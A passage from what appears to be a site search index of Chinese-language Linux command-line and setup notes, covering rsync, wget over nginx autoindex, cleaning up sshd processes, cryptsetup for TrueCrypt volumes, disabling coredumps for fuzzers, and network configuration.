\u6ce8\u610f\u6e90\u8def\u5f84/path\u540e\u9762\u4e0d\u80fd\u6709/\uff0c\u5426\u5219rsync\u4e0d\u4f1a\u521b\u5efa/mnt/path\u8fd9\u4e2a\u6587\u4ef6\u5939\uff1b/path\u88ab\u4e24\u5c42\u5f15\u53f7\u5305\u56f4\u662f\u4e3a\u4e86\u652f\u6301\u542b\u6709\u7a7a\u683c\u7684\u6587\u4ef6\u5939\u540d\u79f0\uff0c\u4e00\u5c42\u662f\u672c\u5730\u547d\u4ee4\uff0c\u8fdc\u7a0b\u76ee\u5f55\u4e5f\u8981\u4e00\u5c42 rsync\u7684 --progress -v \u53c2\u6570\u8868\u793a\u663e\u793a\u5f53\u524d\u8fdb\u5ea6\u548c\u66f4\u591a\u5185\u5bb9\uff0c -a \u8868\u793aarchive\u9012\u5f52\u5e76\u5c3d\u53ef\u80fd\u539f\u6837\u4fdd\u7559\u6240\u6709\u4fe1\u606f\uff0c -u \u8868\u793a\u8df3\u8fc7\u5df2\u7ecf\u5b58\u5728\u7684\u6587\u4ef6 \u67e5\u770bman\u6587\u6863 explainshell.com","title":"scp\u76ee\u5f55\u65ad\u70b9\u7eed\u4f20"},{"location":"Linux-cli/#wgetscp","text":"\u5728\u5185\u7f51\u4f20\u8f93\u975e\u654f\u611f\u6570\u636e\u65f6\uff0c\u6ca1\u6709\u5fc5\u8981\u4f7f\u7528scp\uff08\u57fa\u4e8essh\uff09\u7684\u5b89\u5168\u4f20\u8f93\uff0c\u5c24\u5176\u662f\u6811\u8393\u6d3e\u8fd9\u79cd\u8ba1\u7b97\u6027\u80fd\u6709\u9650\u7684\u60c5\u5f62\u3002\u4f7f\u7528HTTP\u80fd\u6709\u6548\u52a0\u901f\u4f20\u8f93\u8fc7\u7a0b\uff0c\u4e14\u90e8\u7f72\u7b80\u5355\uff0c\u76f8\u6bd4\u914d\u7f6e\u590d\u6742\u7684vsftpd\u53ef\u4ee5\u8bf4\u662f\u5f88\u7b80\u5355\u4e86","title":"\u4f7f\u7528wget\u4ee3\u66ffscp\u4f20\u8f93\u6587\u4ef6\u5939 \u907f\u514d\u65e0\u8c13\u7684\u52a0\u5bc6\u6027\u80fd\u635f\u5931\uff08\u9002\u7528\u4e8e\u6811\u8393\u6d3e\uff09"},{"location":"Linux-cli/#_10","text":"\u4f7f\u7528nginx\u914d\u7f6e\u5141\u8bb8\u5217\u76ee\u5f55\u5373\u53ef\uff0c\u5728/etc/nginx/sites-enabled/\u4e0b\u6dfb\u52a0\u4e00\u4e2a\u6587\u4ef6\uff1a server{ listen 8080; root /path/to/your/dir; autoindex on; autoindex_exact_size off; autoindex_localtime on; } \u5982\u679c\u4f60\u4e0d\u5177\u6709root\u6743\u9650\uff0c\u53ef\u4ee5\u590d\u5236\u4e00\u4efdnginx.conf\uff0c\u4fee\u6539\u5176\u4e2d\u51fa\u73b0\u7684\u6240\u6709\u4f60\u6ca1\u6709\u6743\u9650\u4fee\u6539\u7684\u6587\u4ef6\u8def\u5f84\uff0c\u4f8b\u5982access_log\uff0c\u7136\u540e\u4f7f\u7528 nginx -c /home/yourname/nginx.conf \uff08\u6ce8\u610f\u5fc5\u987b\u7edd\u5bf9\u8def\u5f84\uff09\u542f\u52a8\u4f60\u7684nginx\uff0c\u6ca1\u6709\u51fa\u73b0EMRG\u9519\u8bef\u5373\u4e3a\u542f\u52a8\u6210\u529f\uff08\u53ef\u4ee5\u4f7f\u7528netstat -pant\u89c2\u5bdf\u662f\u5426\u6210\u529f\u76d1\u542c\u7aef\u53e3\uff09","title":"\u670d\u52a1\u7aef\uff08\u6570\u636e\u4f20\u51fa\u7aef\uff09"},{"location":"Linux-cli/#wget_1","text":"alias myget='wget -r -np -nH -R index.html --restrict-file-names=nocontrol -p -N -l0 -e robots=off --read-timeout=20 --tries=0' cd /mnt #\u4e0b\u8f7d\u5230\u54ea myget http://server_IP:8080/yourdir #\u76f8\u5f53\u4e8e\u5c06yourdir\u590d\u5236\u5230\u5f53\u524d\u6587\u4ef6\u5939 \u53c2\u6570\u8bf4\u660e\uff1a -r \u9012\u5f52\u4e0b\u8f7d\uff0c-np\u4e0d\u8981\u8fdb\u5165\u7236\u76ee\u5f55\uff0c-nH\u4e0d\u8981\u521b\u5efahost\u6587\u4ef6\u5939\uff0c-R index.html\u4e0d\u8981\u4fdd\u5b58\u6587\u4ef6\u5217\u8868\u7684index.html\uff0c\u2013restrict-file-names=nocontrol\u4e0d\u8981\u4e71\u6539\u4e2d\u6587\u6587\u4ef6\u540d -p \u8981\u4e0b\u8f7d\u56fe\u7247\uff0c-N \u4f7f\u7528\u6d4f\u89c8\u5668304\u7684\u65b9\u5f0f\u907f\u514d\u91cd\u590d\u4e0b\u8f7d\uff0c-l0\u9012\u5f52\u5c42\u6570\u4e0d\u9650\u5236\uff0c-e robots=off\u4e0d\u68c0\u67e5robots.txt \u2013read-timeout=20 \u5982\u679c20s\u4e4b\u5185\u6ca1\u6709\u6570\u636e\u4f20\u8f93\u5219\u8ba4\u4e3a\u5931\u8d25\u8fdb\u884c\u91cd\u8bd5\uff0c\u2013tries=0\u65e0\u9650\u6b21\u91cd\u8bd5 \u67e5\u770bman\u6587\u6863","title":"\u5ba2\u6237\u7aef\uff08\u6570\u636e\u4f20\u5165\u7aef\uff09\uff0c\u4f7f\u7528wget\uff1a"},{"location":"Linux-cli/#sshd","text":"\u5982\u679c\u4f60\u53d1\u73b0ps aux\u6216netstat -pant\u8f93\u51fa\u4e86\u5927\u91cfsshd\u7684\u4fe1\u606f\uff0c\u8bf4\u660e\u4e4b\u524dssh\u8fde\u63a5\u65ad\u5f00\u540esshd\u5e76\u6ca1\u6709\u9000\u51fa\u800c\u662f\u4e00\u76f4\u5360\u7528\u5185\u5b58 \u6211\u4eec\u53ef\u4ee5\u6e05\u9664\u6389\u8fd9\u4e9b\u8fdb\u7a0b\u6765\u91ca\u653e\u5185\u5b58 \u9996\u5148\u901a\u8fc7 pstree -p \u6765\u67e5\u770b\u5f53\u524d\u4f60\u7684ssh\u4f1a\u8bdd\u7684sshd\u8fdb\u7a0bPID\uff0c\u4f8b\u5982\u8f93\u51fa\u4e86\u8fd9\u6837\u4e00\u884c\uff1a \u251c\u2500sshd(32275)\u2500\u2500\u2500bash(32413)\u2500\u2500\u2500pstree(6543) \u5219\u8bf4\u660e\u5f53\u524dsshd\u7684pid\u4e3a32275\uff0c\u7136\u540e\u6267\u884c\u4e0b\u9762\u8fd9\u6761\u547d\u4ee4\u6765kill -9\u5176\u4ed6\u6240\u6709\u7684sshd\u8fdb\u7a0b\uff1a ps -ef | grep sshd | grep -v 32275 | grep -v grep | awk '{print \"kill -9\", $2}' |sh Hint: \u5982\u679c\u5f53\u524d\u4e3b\u673a\u8fd8\u8fd0\u884c\u7740Docker\u5bb9\u5668\uff0c\u5982\u679c\u5bb9\u5668\u7684\u5b88\u62a4\u8fdb\u7a0b\u662fsshd\uff0c\u4e0a\u4e00\u6761\u547d\u4ee4\u53ef\u80fd\u4f7f\u5bb9\u5668\u9000\u51fa\uff1b\u6240\u4ee5\u4f60\u8fd8\u9700\u8981 docker top \u6765\u786e\u5b9a\u5bb9\u5668\u7684sshd\u5728\u4e3b\u673a\u4e0a\u7684pid\u53f7","title":"\u6e05\u9664\u5df2\u7ecf\u65ad\u5f00\u7684sshd\u8fdb\u7a0b"},{"location":"Linux-cli/#_11","text":"\u4f8b\u5982\u6279\u91cf\u9012\u5f52\u66ff\u6362\u5f53\u524d\u6587\u4ef6\u5939\u53ca\u5b50\u6587\u4ef6\u5939\u6240\u6709php\u6587\u4ef6\uff0c\u5c06\u5176\u4e2d\u7684\u201daha/666\u201d\u6539\u4e3a\u201dovo/999\u201d \u547d\u4ee4\u5982\u4e0b\uff1a find . -type f -name \"*.php\" -exec sed -i 's~aha/666~ovo/999~g' {} + \u5176\u4e2dsed -i\u539f\u4f4d\u66ff\u6362\u7528\u7684\u5206\u9694\u7b26\u7531\u4e8e\u66ff\u6362\u524d\u540e\u5b57\u7b26\u4e32\u4e2d\u51fa\u73b0\u4e86/\uff0c\u6240\u4ee5\u4e0d\u80fd\u7528\u7ecf\u5178\u7684/\uff0c\u800c\u6539\u7528~","title":"\u6279\u91cf\u66ff\u6362\u6587\u672c"},{"location":"Linux-cli/#_12","text":"\u4f8b\u5982wget\u9012\u5f52\u4e0b\u8f7d\uff0c\u4e2d\u9014\u88ab\u4e2d\u65ad\u4e86\uff0c\u6062\u590d\u7684\u65f6\u5019\u4e0e\u5176\u6bcf\u4e2a\u6587\u4ef6\u90fd\u8bf7\u6c42\u4e00\u6b21\u4e0d\u5982\u76f4\u63a5\u8df3\u8fc7\u5df2\u7ecf\u5b58\u5728\u7684\u6587\u4ef6 \u90a3\u5c31\u9700\u8981\u627e\u5230\u4e2d\u65ad\u7684\u65f6\u5019\u6b63\u5728\u5199\u5165\u54ea\u4e2a\u6587\u4ef6\uff0c\u5220\u6389\u8fd9\u4e2a\u6587\u4ef6\u7ee7\u7eed \u8fd9\u4e2a\u547d\u4ee4\u53ef\u4ee5\u4ee5\u65f6\u95f4\u987a\u5e8f\u663e\u793a\u5f53\u524d\u6587\u4ef6\u5939\u53ca\u5b50\u6587\u4ef6\u5939\u6587\u4ef6\uff0c\u65b0\u6587\u4ef6\u663e\u793a\u5728\u6700\u524d\u9762 find . -type f -printf '%TY-%Tm-%Td %TT %p\\n' | sort -r|less","title":"\u627e\u5230\u6700\u8fd1\u4fee\u6539\u7684\u6587\u4ef6"},{"location":"Linux-cli/#cryptsetuptruecrypt","text":"\u5728ubuntu 16.04\u4e2d\u7f16\u8bd1truecrypt 7.1a\u8fd0\u884c\u65f6\u51fa\u73b0\u9519\u8bef\uff1a error: Invalid characters encountered. \u5728\u8fd9\u4e2a\u94fe\u63a5\u4e0a\u627e\u5230\u4e86\u7b54\u6848\uff08\u611f\u8c22\u5728\u5176\u4ed6\u8bba\u575b\u627e\u5230\u7b54\u6848\u540e\u4e3b\u52a8\u63d0\u4f9b\u89e3\u51b3\u65b9\u6848\u7684Jakub Urbanowicz\uff09 https://bugs.archlinux.org/task/47325 \u539f\u8d34\u5730\u5740\uff08\u641c\u7d22cryptsetup\uff09\uff1ahttps://forums.gentoo.org/viewtopic-p-7809512.html \u65b9\u6cd5\u662f\uff1a sudo su # \u4ee5\u4e0b\u547d\u4ee4\u90fd\u8981 root\u6743\u9650 \uff0c\u5982\u679c\u5728 Docker\u5bb9\u5668\u4e2d\u5c1d\u8bd5 \u542f\u52a8\u5bb9\u5668\u65f6\u9700\u8981 --privileged # \u5148\u5b89\u88c5 cryptsetup apt install - y cryptsetup - bin # \u6302\u8f7d\uff0c\u6ce8\u610f type\u524d\u9762\u662f\u4e24\u4e2a\u6a2a\u7ebf \uff0c\u6587\u4ef6\u8def\u5f84\u53ef\u4ee5\u662f / dev / sdb1 \uff0c\u540d\u79f0\u968f\u4fbf\u586b cryptsetup open --type tcrypt truecrypt\u6587\u4ef6\u8def\u5f84 \u540d\u79f0 # \u7136\u540e mount\u6302\u8f7d mount / dev / mapper / \u540d\u79f0 \u6302\u8f7d\u70b9 # \u5378\u8f7d\u7684\u65f6\u5019\u8bb0\u5f97 close \uff0c\u90fd\u8fd8\u662f\u8981 root\u6743\u9650 umount \u6302\u8f7d\u70b9 cryptsetup close \u540d\u79f0","title":"\u4f7f\u7528cryptsetup\u6302\u8f7dtruecrypt\u5206\u533a"},{"location":"Linux-cli/#_13","text":"\u7528binwalk\u53d1\u73b0\u9700\u8981\u7684\u7247\u6bb5\u7684\u8d77\u59cb\u4f4d\u70b9\uff0c\u4ee5\u53ca\u8ba1\u7b97\u51fa\u957f\u5ea6 binwalk\u76f4\u63a5-e\u6709\u65f6\u5019\u5c31\u80fd\u6ee1\u8db3\u9700\u6c42\uff0c\u4f46\u5982\u679c\u662fexe\u6587\u4ef6 exe\u672c\u8eab\u53ef\u80fd\u88ab\u62c6\u6210\u591a\u4e2a\u6587\u4ef6 \u5982\u4e00\u5806\u8bc1\u4e66\uff0c\u8fd9\u65f6\u5019\u53ef\u4ee5 binwalk -D 'exe' \u6587\u4ef6\u540d \u6216\u8005\u7528dd\uff0c\u6ce8\u610f\u522b\u7528bs=1 \u592a\u6162\uff1a dd if=input.binary of=output.binary skip=$offset count=$bytes iflag=skip_bytes,count_bytes From: https://stackoverflow.com/questions/1423346/how-do-i-extract-a-single-chunk-of-bytes-from-within-a-file \u5982\u679c\u7701\u7565\u6389count\u5c31\u662f\u4e00\u76f4\u5230\u672b\u5c3e","title":"\u4ece\u4e8c\u8fdb\u5236\u6587\u4ef6\u4e2d\u63d0\u53d6\u7247\u6bb5"},{"location":"Linux-cli/#redis","text":"FROM: https://stackoverflow.com/questions/4006324/how-to-atomically-delete-keys-matching-a-pattern-using-redis \u5220\u9664\u5f53\u524d\u6570\u636e\u5e93\u4e2dprefix\u5f00\u5934\u7684\u6240\u6709key\uff1a EVAL \"local keys = redis.call('keys', ARGV[1]) \\n for i=1,#keys,5000 do \\n redis.call('del', unpack(keys, i, math.min(i+4999, #keys))) \\n end \\n return keys\" 0 prefix*","title":"redis\u5339\u914d\u524d\u7f00\u5220\u9664\u5927\u91cf\u952e\u503c"},{"location":"Linux-cli/#_14","text":"\u4f7f\u7528 sed -i \u548c find \u4f8b\u5982\u672c\u7ad9\u7f16\u8bd1\u811a\u672c\u5728mkdocs\u7f16\u8bd1\u540e\u5bf9\u6240\u6709.html\u6587\u4ef6\u6267\u884c\u66ff\u6362\uff0c\u6539\u7528\u56fd\u5185CDN sed -i 's#cdnjs.cloudflare.com#cdnjs.loli.net#g' $(find -type f -name \"*.html\") sed -i 's#fonts.googleapis.com#fonts.loli.net#g' $(find -type f -name \"*.html\")","title":"\u6279\u91cf\u66ff\u6362\u5b50\u76ee\u5f55\u7279\u5b9a\u540e\u7f00\u540d\u6587\u4ef6\u5185\u5bb9"},{"location":"Linux-cli/#coredump-in-fuzzing","text":"\u53c2\u8003\uff1a http://man7.org/linux/man-pages/man5/core.5.html \u4e3a\u5565afl\u8981\u6c42\u6211\u4eec echo core >/proc/sys/kernel/core_pattern \u5462\uff1f fuzzing\u65f6\u600e\u4e48\u907f\u514d\u4ea7\u751fcoredump\u4ea7\u751f\u5927\u91cfIO\u6d6a\u8d39\u65f6\u95f4\uff1f","title":"coredump in fuzzing"},{"location":"Linux-cli/#core_pattern","text":"\u8fd9\u4e2a\u6587\u4ef6 /proc/sys/kernel/core_pattern \u662f\u547d\u540dcoredump\u6587\u4ef6\u7684\u6a21\u677f\uff0c\u6bd4\u5982\u6539\u4e3a core \u4e4b\u540e\u4ea7\u751f\u7684coredump\u6587\u4ef6\u5c31\u53eb\u505a core \u53e6\u4e00\u4e2a\u6587\u4ef6 /proc/sys/kernel/core_uses_pid \u5982\u679c\u662f1\u7684\u8bdd\uff0c\u8fd8\u4f1a\u52a0\u4e0a .pid","title":"core_pattern\u662f\u5565"},{"location":"Linux-cli/#coredump","text":"\u5168\u5c40\u5173\u95ed\uff1a echo >/proc/sys/kernel/core_pattern echo 0 >/proc/sys/kernel/core_uses_pid \u8fd8\u53ef\u4ee5\u5728\u5f53\u524d\u76ee\u5f55 mkdir core \uff0c\u6709\u4e86\u540c\u540d\u6587\u4ef6\u5939\u5c31\u4e0d\u4f1a\u518d\u5199core\u6587\u4ef6\u4e86 fuzzer\u53ef\u4ee5\u7528rlimit\u7684\u529f\u80fd\u9650\u5236\u5b50\u8fdb\u7a0b\uff1a \u6587\u6863\u8bf4\u4e86 RLIMIT_CORE \u8fd9\u4e2a\u9650\u5236\uff0c\u53ea\u8981\u5b83\u662f0\u5c31\u4e0d\u4f1a\u4ea7\u751f\u4e86\uff0c\u6bd4\u5982 AFL\u7684\u4ee3\u7801 \uff1a /* Dumping cores is slow and can lead to anomalies if SIGKILL is delivered before the dump is complete. */ r . rlim_max = r . rlim_cur = 0 ; setrlimit ( RLIMIT_CORE , & r ); /* Ignore errors */ \u518d\u6bd4\u5982 honggfuzz\u7684\u4ee3\u7801 \uff08honggfuzz-1.7\u5e76\u6ca1\u6709\u8003\u8651\u8fd9\u4e2a\uff09\uff1a /* in cmdline . c */ { { \"rlimit_core\" , required_argument , NULL , 0x103 }, \"Per process RLIMIT_CORE in MiB (default: 0 [no cores are produced])\" }, /* in subproc . c */ #ifdef RLIMIT_CORE const struct rlimit rl = { . rlim_cur = run -> global -> exe . coreLimit * 1024 ULL * 1024 ULL , . rlim_max = run -> global -> exe . coreLimit * 1024 ULL * 1024 ULL , }; if ( setrlimit ( RLIMIT_CORE , & rl ) == - 1 ) { PLOG_W ( \"Couldn't enforce the RLIMIT_CORE resource limit, ignoring\" ); } #endif /* ifdef RLIMIT_CORE */","title":"\u600e\u4e48\u624d\u80fd\u4e0d\u4ea7\u751fcoredump"},{"location":"Linux-cli/#bash","text":"shuf filename|while read line; do python3 run.py \"$line\"; done","title":"bash\u5bf9\u6587\u4ef6\u4e71\u5e8f\u904d\u5386"},{"location":"Linux-cli/#grep_1","text":"ls /tmp/test | grep -P '[\\p{Han}]' \u53c2\u8003 https://www.regular-expressions.info/unicode.html#script","title":"grep\u67e5\u627e\u4e2d\u6587"},{"location":"Linux-cli/#grep_2","text":"\u573a\u666f\uff1afuzzing lava \u6d4b\u8bd5\u96c6\uff0c\u505a\u4e8630\u6b21\u91cd\u590d\uff08\u6bcf\u6b21\u91cd\u590d\u6587\u4ef6\u5939\u540d\u79f0\u672b\u5c3e\u4e3a _\u91cd\u590d \uff09\uff0c\u5df2\u7ecf\u5c06crash\u8fd0\u884c\u5f97\u5230\u7684stdout\u548cstderr\u5b58\u50a8\u4e3a\u6587\u4ef6\uff0c\u60f3\u7edf\u8ba1\u6bcf\u6b21\u91cd\u590d\u89e6\u53d1\u4e86\u591a\u5c11bugid \u6362\u53e5\u8bdd\u8bf4\uff0c\u5df2\u77e5\u5f53\u524d\u6587\u4ef6\u5939\u4e0b\u6709\u4e00\u4e9b\u53ef\u80fd\u88ab\u5f53\u6210\u4e8c\u8fdb\u5236\u7684\u6587\u672c\u6587\u4ef6\uff0c\u5305\u542b Successfully triggered bug 576, crashing now! \uff0c\u6211\u60f3\u5c06\u5176\u4e2d\u7684576\u63d0\u53d6\u51fa\u6765\uff0c\u7136\u540e\u5bf9\u6574\u4e2a\u6587\u4ef6\u5939\u8ba1\u6570 \u6ce8\u610fgrep\u7684\u65f6\u5019\u4e00\u5b9a\u8981\u2013text\uff0c\u4e0d\u7136\u4f1a\u6f0f\u6389\u4e00\u4e9b\u6587\u4ef6 \u7528\u5230\u4e86grep\u7684\u6b63\u5219\u63d0\u53d6\uff0c\u524d\u7f6e\u5224\u65ad\u7528 (?<=\u6587\u672c) \uff0c\u540e\u7f6e\u5224\u65ad\u7528 (?=\u6587\u672c) \uff0c\u4f8b\u5982\u63d0\u53d6 aaa123bbb \u4e2d\u7684123\u5c31\u53ef\u4ee5\uff1a echo aaa123bbb|grep -P '(?<=aaa)\\d+(?=bbb)' -o \u5176\u4e2d -P \u8868\u793a\u6b63\u5219\u8bed\u6cd5\u4e3aPerl\uff0c -o \u8868\u793a\u53ea\u663e\u793a\u5339\u914d \u53c2\u8003\uff1a https://unix.stackexchange.com/questions/13466/can-grep-output-only-specified-groupings-that-match for i in `seq 1 1 30`; do if [ -d *_ ${ i } / ]; then (cd *_ ${ i } ; echo $i `grep 'Successfully triggered bug' -r . --text \\ | grep -P '(? < =bug )(\\d+)(?=,)' -o \\ |sort| uniq|wc -l` ); else echo ${ i } 0; fi; done","title":"grep\u6b63\u5219\u63d0\u53d6\u7279\u5b9a\u5185\u5bb9"},{"location":"Linux-cli/#kill","text":"\u5217\u4e3e\u6240\u6709\u8fdb\u7a0b\uff0c\u627e\u51fa\u5185\u5b58\u8d85\u8fc75%\u7684\uff0ckill\u6389 \u6ce8\u610f\u5230sort\u6bd4\u8f83\u6570\u5b57\u5927\u5c0f\u9700\u8981\u7528 -h \u6216\u8005 -V \uff0c\u5426\u5219\u4f1a\u51fa\u73b0 3>20 \u7684\u6bd4\u8f83\u7ed3\u679c\uff08\u5b57\u7b26\u4e32\u6bd4\u8f83\uff09 \u7531\u4e8e [ \"$num\" -gt 5 ] \u53ea\u652f\u6301num\u4e3a\u6574\u6570\u7684\u60c5\u51b5\uff0c\u6240\u4ee5\u7528bc\u4f5c\u6d6e\u70b9\u6570\u5927\u5c0f\u5224\u65ad\uff0c\u53c2\u8003\uff1a https://stackoverflow.com/questions/8654051/how-to-compare-two-floating-point-numbers-in-bash \u7528 grep -v \u8bbe\u7f6e\u767d\u540d\u5355\uff1adocker, perl while true; do LINE=$(ps aux|grep -v docker|grep -v perl|sort -k4 -h|tail -n 1); (( $( echo \"`echo ${ LINE } |awk '{print $4}'` > 5\" |bc -l) )) && \\ (echo $LINE ; kill `echo ${ LINE } |awk '{print $2}'`); sleep 5; done","title":"\u81ea\u52a8kill\u5927\u5185\u5b58\u7684\u8fdb\u7a0b"},{"location":"Linux-cli/#screen","text":"screen -dmS name /bin/bash screen -S name -p 0 -X stuff \"ls\"`echo -ne '\\r'` screen -S name -p 0 -X hardcopy /tmp/test.txt \u4e2d\u6587\u5b57\u7b26\u4f1a\u6709\u95ee\u9898\uff0c\u5f85\u89e3\u51b3","title":"screen\u81ea\u52a8\u64cd\u4f5c\u4ee5\u53ca\u83b7\u53d6\u5f53\u524d\u5c4f\u5e55\u5185\u5bb9"},{"location":"Linux-cli/#c","text":"${i%.*} \u53bb\u6389\u6587\u4ef6\u540d\u7684\u6700\u540e\u4e00\u4e2a\u540e\u7f00 for i in *.c; do gcc $i -o out/ ${ i %.* } ; done","title":"\u7f16\u8bd1\u5f53\u524d\u6587\u4ef6\u5939\u6240\u6709.c\u6587\u4ef6"},{"location":"Linux-cli/#gdb","text":"echo -e \"set pagination off\\nset confirm off\" > ~/.gdbinit \u7136\u540e\u4f7f\u7528 gdb ./a.out -ex \"r inputfile\" -ex \"bt\" -ex \"quit\"","title":"gdb\u81ea\u52a8\u5316"},{"location":"Linux-cli/#mktorrenttorrent","text":"\u53c2\u8003\uff1a https://community.seedboxes.cc/articles/how-to-create-a-torrent-via-the-command-line sudo apt install mktorrent mktorrent -v -a \"http://tracker.nexushd.org/announce.php\" -p folder -o folder.torrent -l 24 \u5176\u4e2d -l 24 \u7684\u610f\u601d\u662f\u6bcf\u4e2a\u5206\u5757\u4e3a2**24=16MB\uff0c\u8fd9\u662f\u5efa\u8bae\u7684\u6700\u5927\u7684\u503c","title":"mktorrent\u5236\u4f5c\u79cd\u5b50torrent\u6587\u4ef6"},{"location":"Linux-cli/#m3u8mp4","text":"\u624b\u673a\u7aef\u7528\u6293\u5305\u8f6f\u4ef6 \u5982HttpCanary\uff0c\u70b9\u5f00\u76f4\u64ad\u56de\u653e\u540e\u4f1a\u5f97\u5230\u4e00\u4e2am3u8\u7684\u5730\u5740\uff0c\u7136\u540e\u4f7f\u7528ffmpeg\u4e0b\u8f7d\u5373\u53ef \u53c2\u8003\uff1ahttps://www.bilibili.com/video/av99036702/ https://gist.github.com/tzmartin/fb1f4a8e95ef5fb79596bd4719671b5d ffmpeg -i http://dtliving-pre.alicdn.com/... -bsf:a aac_adtstoasc -vcodec copy -c copy name.mp4","title":"\u9489\u9489\u76f4\u64ad\u56de\u653e\u4e0b\u8f7d m3u8\u8f6cmp4"},{"location":"Linux-cli/#ls","text":"Ubuntu\u7cfb\u7edf\u7f16\u8f91 ~/.dircolors : (\u5176\u4ed6\u7cfb\u7edf ~/.dir_colors ) DIR 01;36 \u6216\u8005\u6267\u884c\uff1a eval `dircolors | sed -e 's/;34:/;36:/'`","title":"\u9ed1\u8272\u80cc\u666fls \u76ee\u5f55\u6df1\u7eff\u8272\u770b\u4e0d\u6e05\u6539\u4e2a\u989c\u8272"},{"location":"Linux-cli/#seafile","text":"https://download.seafile.com/published/seafile-user-manual/syncing_client/install_linux_client.md \u9700\u8981\u6ce8\u610fseafile-cli\u5df2\u7ecf\u52a0\u5165boinc\u5b98\u65b9\u6e90\uff0c\u4f46\u7248\u672c\u4e0eppa\u6e90\u4e0d\u5339\u914d # apt install -y software-properties-common add-apt-repository -y ppa:seafile/seafile-client apt update apt install seafile-cli -y mkdir ~/seafile seaf-cli init -d ~/seafile seaf-cli start # \u91cd\u542f\u540e\u4e5f\u9700\u8981\u81ea\u5df1\u624b\u52a8\u542f\u52a8 \u5728\u7f51\u9875\u7aef\u521b\u5efa/\u6253\u5f00\u8d44\u6599\u5e93\u540e\u4eceurl\u590d\u5236\u5f97\u5230id \u5ba2\u6237\u7aef\u6ca1\u6709\u9700\u8981\u540c\u6b65\u7684\u6587\u4ef6\u65f6\u7528download\uff0c\u6709\u9700\u8981\u52a0\u5165\u540c\u6b65\u7684\u6570\u636e\u7528sync seaf - cli download - l \"the id of the library\" - s \"the url + port of server\" - d \"the folder which the library will be synced with\" - u \"username on server\" [ - p \"password\" ] \u767b\u5f55\u7528\u6237\u540d\u5bc6\u7801\u9519\u8bef\u7684\u65f6\u5019\u62a5\u9519\u662f400\uff0c\u9700\u8981\u7559\u610f","title":"\u90e8\u7f72seafile\u5ba2\u6237\u7aef"},{"location":"Linux-cli/#pcregrep","text":"\u4f8b\u5982\u6211\u4eec\u8981\u63d0\u53d6some.htm\u4e2d\u6240\u6709href\u5c5e\u6027\u4e2d\u7684html\uff0c\u4f7f\u7528\u666e\u901a\u7684grep\u4e0d\u80fd\u53ea\u63d0\u53d6\u5355\u72ec\u7684group\u3002\u8fd9\u91cc\u6211\u4eec\u7528pcregrep\u53ef\u4ee5\u6307\u5b9a -o \u53c2\u6570\uff0c\u8fd8\u53ef\u4ee5\u591a\u6b21\u6307\u5b9a\u8fde\u7eed\u8f93\u51fa # apt install -y pcregrep pcregrep -o1 'href=\"([^\\.]*\\.htm)\"' some.htm","title":"pcregrep\u6b63\u5219\u63d0\u53d6"},{"location":"Linux-cli/#_15","text":"\u53c2\u8003\uff1ahttps://harttle.land/2020/06/06/tail-f-pipe.html grep \u6dfb\u52a0 --line-buffered \uff0csed \u6dfb\u52a0 -u \uff0cawk \u8c03 fflush() \u3002 Shell \u91cc\u53ef\u4ee5\u901a\u8fc7 [ -t 1 ] \u6765\u5224\u65ad stdout\uff08\u6587\u4ef6\u63cf\u8ff0\u7b26 1\uff09 \u662f\u5426\u662f TTY\u3002 More \u4f8b\u5b50\uff1a tail -f log.txt | grep --line-buffered Error | sed -u 's/harttle//' | awk ' ${ print $ 1 ; fflush () } ' | grep ENOENT","title":"\u7ba1\u9053\u5173\u95ed\u7f13\u51b2"},{"location":"Linux-cli/#_16","text":"\u4f8b\u5982\u5e76\u884c\u542f\u52a8\u7f16\u8bd1\u8fdb\u7a0b\uff0c\u5e0c\u671b\u7b49\u5f85\u6240\u6709gcc\u7ed3\u675f\uff1a while [ \"`pgrep -c gcc`\" -gt 0 ]; do echo cnt: `pgrep -c gcc` sleep 10; done","title":"\u7b49\u5f85\u7279\u5b9a\u8fdb\u7a0b\u7ed3\u675f"},{"location":"Linux-setup/","text":"Linux\u7cfb\u7edf\u914d\u7f6e \u00b6 \u672c\u6587\u6863\u4e3aLinux\u670d\u52a1\u5668\u7684\u914d\u7f6e\u65b9\u9762\u7684\u7b14\u8bb0\uff0cLinux\u76f8\u5173\u7b14\u8bb0\u8fd8\u6709\uff1a Linux\u547d\u4ee4\u884c\u64cd\u4f5c\u6280\u5de7 SSH\u8fdc\u7a0b\u767b\u5f55 Linux\u5907\u4efd TOC: \u5982\u4f55\u7ffb\u5899 \u00b6 \u90e8\u7f72shadowsocks\u5ba2\u6237\u7aef\uff0c\u5e76\u90e8\u7f72Privoxy\u63d0\u4f9bhttp proxy \u00b6 \u4ee3\u7801\u53c2\u89c1 ssprivoxy.txt \u914d\u7f6e\u6709\u7ebf\u9759\u6001IP \u00b6 vim /etc/network/interfaces # \u5199\u5165\u4ee5\u4e0b\u5185\u5bb9\uff0c\u8bf7\u81ea\u884c\u66ff\u6362xx\u90e8\u5206 iface eth0 inet static address 10 .xx.xx.13 #\u4f60\u9700\u8981\u8bbe\u7f6e\u7684IP netmask 255 .255.255.0 #\u5b50\u7f51\u63a9\u7801 network 10 .xx.xx.0 broadcast 10 .xx.xx.255 gateway 10 .xx.xx.254 #\u7f51\u5173 dns-nameservers 10 .10.0.21 #dns\u670d\u52a1\u5668 # \u6309Esc, :wq\u9000\u51fa\u4fdd\u5b58 service networking restart ifconfig eth0 10 .xx.xx.13 netmask 255 .255.255.0 up route add default eth0 #\u8def\u7531\u914d\u7f6e\u4e5f\u5f88\u91cd\u8981\uff0c\u9519\u8bef\u7684\u8def\u7531\u5c06\u5bfc\u81f4\u4e0d\u80fd\u8bbf\u95ee route add default gw 10 .xx.xx.254 dev eth0 #\u8fd9\u91cc\u8bbe\u7f6e\u4e3a\u4f60\u7684\u7f51\u5173 \u6ce8\u610f\u4f7f\u7528ifconfig\u8fdb\u884cip\u7684\u4fee\u6539\u540e\uff0c\u4f1a\u4e22\u5931\u8def\u7531\u4fe1\u606f\u3001\u989d\u5916\u7684ip\u8bbe\u7f6e\uff0c\u9700\u8981\u91cd\u65b0\u914d\u7f6eroute\uff08\u6267\u884c\u4e0a\u8ff0\u4e24\u6761route\u547d\u4ee4\u5373\u53ef\uff09 \u914d\u7f6e\u4e3adhcp\u81ea\u52a8\u83b7\u53d6ip\uff0c\u89e3\u51b3RTNETLINK answers: File exists\u95ee\u9898 \u00b6 \u4e4b\u524d\u5df2\u7ecf\u914d\u7f6e\u8fc7\u9759\u6001ip\uff0c\u73b0\u5728\u8981\u6539\u4e3a\u81ea\u52a8\u83b7\u53d6 dhclient eth0 \u51fa\u73b0\u62a5\u9519RTNETLINK answers: File 